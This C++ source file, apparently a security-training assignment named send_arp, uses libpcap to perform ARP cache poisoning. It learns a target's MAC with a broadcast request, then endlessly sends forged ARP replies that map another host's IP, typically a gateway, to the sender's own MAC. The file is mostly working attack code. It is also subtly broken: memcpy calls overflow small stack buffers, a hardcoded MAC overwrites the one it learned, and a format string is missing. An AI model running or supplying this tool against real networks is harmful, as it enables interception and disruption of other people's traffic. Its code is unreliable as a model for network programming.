#include <iostream>
#include <pcap.h>
#include <netinet/ip.h>
#include <string.h>
#include "sheader.h"
#include <net/if.h>
#include <sys/ioctl.h>

using namespace std;

void myinfoset(char *dev, uint8_t *ipstr, uint8_t *macstr, uint8_t *netmask){

    ifreq ifr;
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    strncpy(ifr.ifr_name, dev, IFNAMSIZ);

    ioctl(s, SIOCGIFNETMASK, &ifr);
    memcpy((char *)netmask, ifr.ifr_netmask.sa_data+2, 32);

    ioctl(s, SIOCGIFHWADDR, &ifr);
    memcpy((char *)macstr, ifr.ifr_hwaddr.sa_data, 48);

    ioctl(s, SIOCGIFADDR, &ifr);
    memcpy((char *)ipstr, ifr.ifr_addr.sa_data+2, 32);

}


int main(int argc, char* argv[])
{
    char track[] = "취약점";
    char name[] = "남훈";
    printf("[bob8][%s]send_arp[%s]", track, name);
    int i = 0;

    char errbuf[PCAP_ERRBUF_SIZE];

    u_char packet[100];
    u_char packet2[100];
    char* dev = argv[1];

    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

    if(handle == NULL){
        fprintf(stderr, "%s", errbuf);
        return 0;
    }

    uint8_t my_ip[4];
    uint8_t my_mac[6];
    uint8_t netmask[4];

    myinfoset(dev, my_ip, my_mac, netmask);
    for(i = 0; i < 4; i++){
        printf("%02x ", my_ip[i]);
    }

    if (argc != 4) {
      printf("aaa");
      return -1;
    }
    memset(packet, 0, sizeof(packet));

    eth_hdr eth, eth2;
    arp_hdr ath, ath2;
    int packet_len = 0;

    char *a = strtok(argv[2], ".");
    char *b = strtok(NULL, ".");
    char *c = strtok(NULL, ".");
    char *d = strtok(NULL, "\0");

    ath.TIP[0] = atoi(a);
    ath.TIP[1] = atoi(b);
    ath.TIP[2] = atoi(c);
    ath.TIP[3] = atoi(d);

    char *a1 = strtok(argv[3], ".");
    char *b1 = strtok(NULL, ".");
    char *c1 = strtok(NULL, ".");
    char *d1 = strtok(NULL, "\0");

    for(i = 0; i < 4; i++){
        ath.SIP[i] = my_ip[i];
    }
    //sendARP to destination (Broadcast) -> destination mac
    for(i = 0; i < 6; i++){
        eth.dst[i] = 0xff;
        eth.src[i] = my_mac[i];
        ath.Smac[i] = my_mac[i];
    }



    //ARP type
    eth.type = ntohs(0x0806);

    //ARP HEADER
    ath.Htype = ntohs(0x0001);
    ath.Ptype = ntohs(0x0800);
    ath.H_add_len = 6;
    ath.P_add_len = 4;
    ath.Opcode = ntohs(0x0001);



    //Tmac
    for(i = 0; i < 6; i++){
        ath.Tmac[i] = 0x00;
    }
    //Tmac



    memcpy(packet, &eth, sizeof(eth));
    packet_len += sizeof(eth_hdr);
    memcpy(packet + packet_len, &ath, sizeof(ath));
    packet_len += sizeof(arp_hdr);

    pcap_sendpacket(handle, packet, packet_len);


    while(true){

        struct pcap_pkthdr* header;
        const u_char* packet;
        //char *sm;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;
        printf("%u bytes captured\n", header->caplen);
        eth_hdr * eth_res = (eth_hdr *)packet;
        arp_hdr * arp_res = (arp_hdr *)(packet + sizeof(eth_hdr));
        if(eth_res->type == ntohs(0x0806) && arp_res->Opcode == ntohs(0x0002)){
            for(int i=0; i<6; i++){
                 ath2.Tmac[i] = arp_res->Smac[i];
                 eth2.dst[i] = arp_res->Smac[i];
            }
            break;
        }



    }

    ath2.TIP[0] = atoi(a);
    ath2.TIP[1] = atoi(b);
    ath2.TIP[2] = atoi(c);
    ath2.TIP[3] = atoi(d);

    ath2.SIP[0] = atoi(a1);
    ath2.SIP[1] = atoi(b1);
    ath2.SIP[2] = atoi(c1);
    ath2.SIP[3] = atoi(d1);

    for(i = 0; i <6; i++){
        eth2.src[i] = my_mac[i];
        ath2.Smac[i] = my_mac[i];
    }
    eth2.type = ntohs(0x0806);
    ath2.Htype = ntohs(0x0001);
    ath2.Ptype = ntohs(0x0800);
    ath2.H_add_len = 6;
    ath2.P_add_len = 4;
    ath2.Opcode = ntohs(0x0002);

    ath2.Tmac[0] = 0x1c;
    ath2.Tmac[1] = 0x1b;
    ath2.Tmac[2] = 0xb5;
    ath2.Tmac[3] = 0x09;
    ath2.Tmac[4] = 0xe8;
    ath2.Tmac[5] = 0xe5;

    packet_len = 0;
    memcpy(packet2, &eth2, sizeof(eth2));
    packet_len += sizeof(eth_hdr);
    memcpy(packet2 + packet_len, &ath2, sizeof(ath2));
    packet_len += sizeof(arp_hdr);

    while(true){
        pcap_sendpacket(handle, packet2, packet_len);
    }
    printf("%s", packet);

    if(pcap_sendpacket(handle, packet, packet_len)){
        fprintf(stderr, "Err : ", pcap_geterr(handle));
    }
}
